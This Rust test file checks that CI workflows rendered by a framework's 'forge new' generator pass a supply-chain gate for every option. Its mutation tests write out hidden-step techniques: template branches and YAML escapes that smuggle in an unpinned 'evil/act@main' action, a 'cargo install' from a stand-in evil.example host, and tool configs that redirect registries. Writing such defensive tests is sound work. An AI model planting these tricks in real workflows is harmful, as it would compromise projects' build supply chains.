//! The supply-chain gate on what `forge new` writes (docs/supply-chain.md).
//! Every file under `.github/` of a generated application, rendered by the
//! real generator for every option, passes every rule of the framework's own
//! gate. The rules are shared with `crates/forge/tests/supply_chain.rs`
//! through `#[path]`. The gate reads the rendered output, not the template,
//! so a `%%if%%` branch cannot hide a step: no line is read in a context the
//! generator never produces.

use std::collections::BTreeSet;

#[path = "../../../forge/tests/gate/rules.rs"]
mod rules;

use rules::{
    allowlist_violations, checkout_violations, closed_list_violations, container_violations,
    environment_violations, parser_violations, permission_violations, pin_violations,
    secret_violations, tool_configuration_files, tool_install_violations, tree_violations,
    yaml_subset_violations,
};

use super::{
    Conditions, Database, ForgeSource, Locale, NewApplication, TEMPLATES, create_application,
    render,
};

const DATABASES: [Database; 5] = [
    Database::Postgresql,
    Database::Mysql,
    Database::Mariadb,
    Database::Sqlite3,
    Database::Disabled,
];

/// Every combination of the options a template can test: each backend and
/// none, with and without Docker, full-stack and `--api`.
fn every_condition() -> Vec<Conditions> {
    let mut all = Vec::new();
    for database in DATABASES {
        for docker in [true, false] {
            for views in [true, false] {
                all.push(Conditions {
                    docker,
                    database,
                    views,
                });
            }
        }
    }
    all
}

/// Every rule of the gate: the YAML, parser, pin, allowlist and environment
/// rules on every file, and the workflow rules (checkouts, containers,
/// permissions, secrets, tool installs, the parsed tree) on workflows. The
/// name is prefixed so that no generated file takes an exemption the
/// framework's own release workflow or cargo-tool action has.
fn gate(relative: &str, text: &str) -> Vec<String> {
    let name = format!("generated {relative}");
    let mut violations = yaml_subset_violations(&name, text);
    violations.extend(parser_violations(&name, text));
    violations.extend(pin_violations(&name, text));
    violations.extend(allowlist_violations(&name, text));
    violations.extend(environment_violations(&name, text));
    violations.extend(closed_list_violations(&name, text));
    if !relative.starts_with(".github/workflows/") {
        return violations;
    }
    violations.extend(tree_violations(&name, text, false));
    violations.extend(checkout_violations(&name, text));
    violations.extend(container_violations(&name, text));
    violations.extend(permission_violations(&name, text, false));
    violations.extend(secret_violations(&name, text, false));
    violations.extend(tool_install_violations(&name, text));
    violations
}

fn github_files(root: &std::path::Path) -> Vec<(String, String)> {
    let mut pending = vec![root.join(".github")];
    let mut found = Vec::new();
    while let Some(directory) = pending.pop() {
        let entries = std::fs::read_dir(&directory)
            .unwrap_or_else(|error| panic!("{}: {error}", directory.display()));
        for entry in entries {
            let path = entry
                .unwrap_or_else(|error| panic!("{}: {error}", directory.display()))
                .path();
            if path.is_dir() {
                pending.push(path);
            } else {
                let relative = path
                    .strip_prefix(root)
                    .unwrap_or(&path)
                    .to_string_lossy()
                    .into_owned();
                let text = std::fs::read_to_string(&path)
                    .unwrap_or_else(|error| panic!("{}: {error}", path.display()));
                found.push((relative, text));
            }
        }
    }
    found.sort();
    found
}

#[test]
fn every_rendered_workflow_passes_the_supply_chain_gate() {
    let expected: BTreeSet<&str> = TEMPLATES
        .iter()
        .map(|template| template.path)
        .filter(|path| path.starts_with(".github/"))
        .collect();
    assert!(
        expected.contains(".github/workflows/ci.yml"),
        "the generated CI workflow moved: {expected:?}"
    );
    for name in ["sample-app", "shop"] {
        for conditions in every_condition() {
            let parent = tempfile::tempdir().unwrap_or_else(|error| panic!("{error}"));
            let options = NewApplication {
                name: name.to_owned(),
                docker: conditions.docker,
                ci: true,
                database: conditions.database,
                views: conditions.views,
                forge: ForgeSource::GitTag,
                locale: Locale::En,
            };
            let root = create_application(parent.path(), &options)
                .unwrap_or_else(|error| panic!("{error}"));
            // D8: no tool configuration file anywhere in the application.
            let configured = tool_configuration_files(&root, &[]);
            assert!(
                configured.is_empty(),
                "{name} with {:?}: tool configuration written: {configured:?}",
                conditions.database
            );
            let files = github_files(&root);
            let written: BTreeSet<&str> = files.iter().map(|(path, _)| path.as_str()).collect();
            assert!(
                written.contains(".github/workflows/ci.yml") && written.is_subset(&expected),
                "{name} {:?}: {written:?}",
                conditions.database
            );
            for (relative, text) in &files {
                let violations = gate(relative, text);
                assert!(
                    violations.is_empty(),
                    "{name} with {:?}, docker {}, views {}:\n{}",
                    conditions.database,
                    conditions.docker,
                    conditions.views,
                    violations.join("\n")
                );
            }
        }
    }
}

/// F1: a branch that hides a step from a reader of the merged template. In
/// a PostgreSQL render the line under the markers is text of a `run: |`
/// block; in every other render it is a step whose escaped `uses` key runs
/// an unpinned, unlisted action. Read in every rendered form, it is refused.
#[test]
fn a_branch_cannot_hide_a_step_from_the_rendered_gate() {
    let template = TEMPLATES
        .iter()
        .find(|template| template.path == ".github/workflows/ci.yml")
        .map(|template| template.content)
        .unwrap_or_default();
    let point = "%%if postgresql%%\n      - run: cargo test";
    assert!(template.contains(point), "the mutation point moved");
    let injected = concat!(
        "%%if !postgresql%%\n",
        "      -\n",
        "%%end%%\n",
        "%%if postgresql%%\n",
        "      - name: Report\n",
        "        run: |\n",
        "%%end%%\n",
        "          \"u\\x73es\": evil/act@main\n",
    );
    let mutated = template.replacen(point, &format!("{injected}{point}"), 1);
    for conditions in every_condition() {
        let text = render(&mutated, &[("%%APP_NAME%%", "sample-app")], conditions);
        let violations = gate(".github/workflows/ci.yml", &text);
        if conditions.database == Database::Postgresql {
            // Here the line is only text; the step it hides elsewhere is
            // caught in the renders below.
            assert!(text.contains("- name: Report\n        run: |\n"));
        } else {
            assert!(
                violations
                    .iter()
                    .any(|violation| violation.contains("escape")),
                "{:?}: the escaped key was accepted: {violations:?}",
                conditions.database
            );
            assert!(
                violations
                    .iter()
                    .any(|violation| violation.contains("evil/act@main")),
                "{:?}: the hidden step was not read: {violations:?}",
                conditions.database
            );
        }
    }
}

/// R1 (round 6): a YAML escape in a double-quoted value spells a command or
/// a variable the text rules would not read; every render refuses it.
#[test]
fn a_quoted_escape_cannot_spell_a_step_past_the_rendered_gate() {
    let template = TEMPLATES
        .iter()
        .find(|template| template.path == ".github/workflows/ci.yml")
        .map(|template| template.content)
        .unwrap_or_default();
    let point = "%%if postgresql%%\n      - run: cargo test";
    assert!(template.contains(point), "the mutation point moved");
    for injected in [
        "      - run: \"c\\x61rgo install evil-tool --git https://evil.example/x\"\n",
        "      - run: \"echo CARGO_\\x48OME=/tmp/h >> $GITHUB_\\x45NV\"\n",
    ] {
        let mutated = template.replacen(point, &format!("{injected}{point}"), 1);
        for conditions in every_condition() {
            let text = render(&mutated, &[("%%APP_NAME%%", "sample-app")], conditions);
            let violations = gate(".github/workflows/ci.yml", &text);
            assert!(
                violations
                    .iter()
                    .any(|violation| violation.contains("double-quoted scalar with an escape")),
                "{:?}: accepted {injected}: {violations:?}",
                conditions.database
            );
        }
    }
}

/// D (round 7): a template that wrote a tool configuration file anywhere in
/// the application, not only under `.github/`, is found by the scan the
/// rendered gate runs on every generated application.
#[test]
fn a_generated_tool_configuration_is_found_anywhere_in_the_application() {
    let parent = tempfile::tempdir().unwrap_or_else(|error| panic!("{error}"));
    let options = NewApplication {
        name: "sample-app".to_owned(),
        docker: true,
        ci: true,
        database: Database::Sqlite3,
        views: false,
        forge: ForgeSource::GitTag,
        locale: Locale::En,
    };
    let root =
        create_application(parent.path(), &options).unwrap_or_else(|error| panic!("{error}"));
    assert!(tool_configuration_files(&root, &[]).is_empty());
    for (relative, content) in [
        (
            ".cargo/config.toml",
            "[source.crates-io]\nreplace-with = \"m\"\n",
        ),
        ("src/.cargo/config", ""),
        ("go.work", "go 1.25\n"),
        (".envrc", "export CARGO_HOME=/tmp/h\n"),
    ] {
        let path = root.join(relative);
        let directory = path.parent().unwrap_or(&root).to_path_buf();
        std::fs::create_dir_all(&directory).unwrap_or_else(|error| panic!("{error}"));
        std::fs::write(&path, content).unwrap_or_else(|error| panic!("{error}"));
        assert!(
            tool_configuration_files(&root, &[]).contains(&path),
            "{relative} was not found"
        );
    }
    std::fs::write(
        root.join("rust-toolchain.toml"),
        "[toolchain]\npath = \"/opt/evil\"\n",
    )
    .unwrap_or_else(|error| panic!("{error}"));
    assert!(tool_configuration_files(&root, &[]).contains(&root.join("rust-toolchain.toml")));
}
